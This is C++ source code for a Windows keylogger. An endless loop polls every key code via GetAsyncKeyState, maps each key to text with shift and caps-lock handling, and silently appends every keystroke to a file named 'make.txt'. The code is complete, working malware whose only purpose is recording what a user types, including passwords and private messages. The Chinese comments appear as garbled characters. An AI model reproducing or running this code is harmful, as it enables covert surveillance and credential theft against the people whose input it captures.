#include <windows.h>
#include <string>
#include <fstream>
using namespace std;

const char *const Version = "alpha 0.1.0.1";

string GetKey(int Key){
	string KeyString = "";
	//�жϷ�������
	const int KeyPressMask = 0x80000000;
	int iShift = GetKeyState(0x10);
	bool IS = (iShift & KeyPressMask) == KeyPressMask;
	if(Key >=186 && Key <=222){
		if(IS){
			switch(Key){
				case 186:
					KeyString = ":";
					break;
				case 187:
					KeyString = "+";
					break;
				case 188:
					KeyString = "<";
					break;
				case 189:
					KeyString = "_";
					break;
				case 190:
					KeyString = ">";
					break;
				case 191:
					KeyString = "?";
					break;
				case 192:
					KeyString = "~";
					break;
				case 219:
					KeyString = "{";
					break;
				case 220:
					KeyString = "|";
					break;
				case 221:
					KeyString = "}";
					break;
				case 222:
					KeyString = "\"";
					break;
			}
		}else switch(Key){
				case 186:
					KeyString = ";";
					break;
				case 187:
					KeyString = "=";
					break;
				case 188:
					KeyString = ",";
					break;
				case 189:
					KeyString = "-";
					break;
				case 190:
					KeyString = ".";
					break;
				case 191:
					KeyString = "/";
					break;
				case 192:
					KeyString = "`";
					break;
				case 219:
					KeyString = "[";
					break;
				case 220:
					KeyString = "\\";
					break;
				case 221:
					KeyString = "]";
					break;
				case 222:
					KeyString = "'";
					break;
		}
	}
	if (Key == VK_ESCAPE)
		KeyString = "[Esc]";
	else if (Key == VK_F1)
		KeyString = "[F1]";
	else if (Key == VK_F2)
		KeyString = "[F2]";
	else if (Key == VK_F3)
		KeyString = "[F3]";
	else if (Key == VK_F4)
		KeyString = "[F4]";
	else if (Key == VK_F5)
		KeyString = "[F5]";
	else if (Key == VK_F6)
		KeyString = "[F6]";
	else if (Key == VK_F7)
		KeyString = "[F7]";
	else if (Key == VK_F8)
		KeyString = "[F8]";
	else if (Key == VK_F9)
		KeyString = "[F9]";
	else if (Key == VK_F10)
		KeyString = "[F10]";
	else if (Key == VK_F11)
		KeyString = "[F11]";
	else if (Key == VK_F12)
		KeyString = "[F12]";
	else if (Key == VK_SNAPSHOT)
		KeyString = "[PrtScr]";
	else if (Key == VK_SCROLL)
		KeyString = "[ScrLk]";
	else if (Key == VK_PAUSE)
		KeyString = "[Pause]";
	else if (Key == VK_CAPITAL)
		KeyString = "[CapsLk]";
	else if (Key == VK_BACK) //<- �ظ��
		KeyString = "[Bksp]";
	else if (Key == VK_RETURN) // �س���������
		KeyString = "[Enter]\n";
	else if (Key == VK_SPACE) // �ո�
		KeyString = " ";
	else if (Key == VK_LSHIFT) // ����ϵ���
		KeyString = "[LShift]";
	else if (Key == VK_RSHIFT) // �Ҳ��ϵ���
		KeyString = "[RShift]";
	else if (Key == VK_TAB) // �Ʊ��
		KeyString = "[Tab]";
	else if (Key == VK_LCONTROL) // ����Ƽ�
		KeyString = "[LCtrl]";
	else if (Key == VK_RCONTROL) // �ҿ��Ƽ�
		KeyString = "[RCtrl]";
	else if (Key == VK_LMENU) // �󻻵���
		KeyString = "[LAlt]";
	else if (Key == VK_RMENU) // �һ�����
		KeyString = "[RAlt]";
	else if (Key == VK_LWIN) // �� WINDOWS ��
		KeyString = "[LWin]";
	else if (Key == VK_RWIN) // �� WINDOWS ��
		KeyString = "[RWin]";
	else if (Key == VK_APPS) // ������ �Ҽ�
		KeyString = "[Menu]";
	else if (Key == VK_INSERT) // ����
		KeyString = "[Ins]";
	else if (Key == VK_DELETE) // ɾ��
		KeyString = "[Del]";
	else if (Key == VK_HOME) // ��ʼ
		KeyString = "[Home]";
	else if (Key == VK_END) // ����
		KeyString = "[End]";
	else if (Key == VK_PRIOR) // ��һҳ
		KeyString = "[PgUp]";
	else if (Key == VK_NEXT) // ��һҳ
		KeyString = "[PgDn]";
	else if (Key == VK_LBUTTON)
		KeyString = "[LMB]";
	else if (Key == VK_RBUTTON)
		KeyString = "[RMB]";
	else if (Key == VK_VOLUME_MUTE)
		KeyString = "[Mute]";
	else if (Key == VK_VOLUME_DOWN)
		KeyString = "[Vol-]";
	else if (Key == VK_VOLUME_UP)
		KeyString = "[Vol+]";
	else if (Key == VK_MEDIA_NEXT_TRACK)
		KeyString = "[MediaNext]";
	else if (Key == VK_MEDIA_PREV_TRACK)
		KeyString = "[MediaPrev]";
	else if (Key == VK_MEDIA_STOP)
		KeyString = "[MediaStop]";
	else if (Key == VK_MEDIA_PLAY_PAUSE)
		KeyString = "[MediaPlay]";
	// �����õļ�����:һ�����û��
	else if (Key == VK_CANCEL) // Cancel
		KeyString = "[Cancel]";
	else if (Key == VK_CLEAR) // Clear
		KeyString = "[Clear]";
	else if (Key == VK_SELECT) //Select
		KeyString = "[Select]";
	else if (Key == VK_PRINT) //Print
		KeyString = "[Print]";
	else if (Key == VK_EXECUTE) //Execute
		KeyString = "[Execute]";
	else if (Key == VK_LEFT) //�ϡ��¡����Ҽ�
		KeyString = "[Left]";
	else if (Key == VK_RIGHT)
		KeyString = "[Right]";
	else if (Key == VK_UP)
		KeyString = "[Up]";
	else if (Key == VK_DOWN)
		KeyString = "[Down]";
	else if (Key == VK_NUMLOCK)//С������������
		KeyString = "[NumLk]";
	else if (Key == VK_ADD) // �ӡ������ˡ���
		KeyString = "+";
	else if (Key == VK_SUBTRACT)
		KeyString = "-";
	else if (Key == VK_MULTIPLY)
		KeyString = "*";
	else if (Key == VK_DIVIDE)
		KeyString = "/";
	else if (Key == 190 || Key == VK_DECIMAL) // С���� . ������ .
		KeyString = ".";
	else if (Key == VK_NUMPAD0)
		KeyString = "0";
	else if (Key == VK_NUMPAD1)
		KeyString = "1";
	else if (Key == VK_NUMPAD2)
		KeyString = "2";
	else if (Key == VK_NUMPAD3)
		KeyString = "3";
	else if (Key == VK_NUMPAD4)
		KeyString = "4";
	else if (Key == VK_NUMPAD5)
		KeyString = "5";
	else if (Key == VK_NUMPAD6)
		KeyString = "6";
	else if (Key == VK_NUMPAD7)
		KeyString = "7";
	else if (Key == VK_NUMPAD8)
		KeyString = "8";
	else if (Key == VK_NUMPAD9)
		KeyString = "9";
	else if (Key >=97 && Key <= 122){ // ��ĸ:a-z
		if (GetKeyState(VK_CAPITAL)){
			if(IS)
				KeyString = Key;
			else
				KeyString = Key - 32;
		}else{
			if(IS)
				KeyString = Key - 32;
			else
				KeyString = Key;
		}
	}
	else if (Key >=48 && Key <= 57){// ��������:0-9���Ϸ��ķ���
		if(IS){
			switch(Key){
				case 48: //0
					KeyString = ")";
					break;
				case 49://1
					KeyString = "!";
					break;
				case 50://2
					KeyString = "@";
					break;
				case 51://3
					KeyString = "#";
					break;
				case 52://4
					KeyString = "$";
					break;
				case 53://5
					KeyString = "%";
					break;
				case 54://6
					KeyString = "^";
					break;
				case 55://7
					KeyString = "&";
					break;
				case 56://8
					KeyString = "*";
					break;
				case 57://9
					KeyString = "(";
					break;
			}
		}else
			KeyString = Key;
	}
	if (Key != VK_LBUTTON || Key != VK_RBUTTON){
		if (Key >=65 && Key <=90){ //ASCII 65-90 ΪA-Z
			if (GetKeyState(VK_CAPITAL)){ // ��д����:���A-Z
				if(IS) // ��д���������Ұ����ϵ���:���ΪСд��ĸ
					KeyString = Key + 32;
				else // ֻ�д�д����:���Ϊ��д��ĸ
					KeyString = Key;
			}else{ // ��дû������:a-z
				if(IS){
					KeyString = Key;
				}else{
					KeyString = Key + 32;
				}
			}
		}
	}
	return KeyString;
}

int main(){
	string Filename = "make.txt";//������¼�ı�����D��log.txtĿ¼��
	string TempString;
	fstream File;
	File.open(Filename.c_str(), std::fstream::out | std::fstream::app);
	while(true){
		Sleep(5);
		for(int i = 8; i <= 255; i ++){
			if(GetAsyncKeyState(i) & 1){
				TempString = GetKey(i);
				File.write(TempString.c_str(), TempString.size());
				File.close();
				File.open(Filename.c_str(), std::fstream::out | std::fstream::app);
			}
		}
	}
	return 0;
}

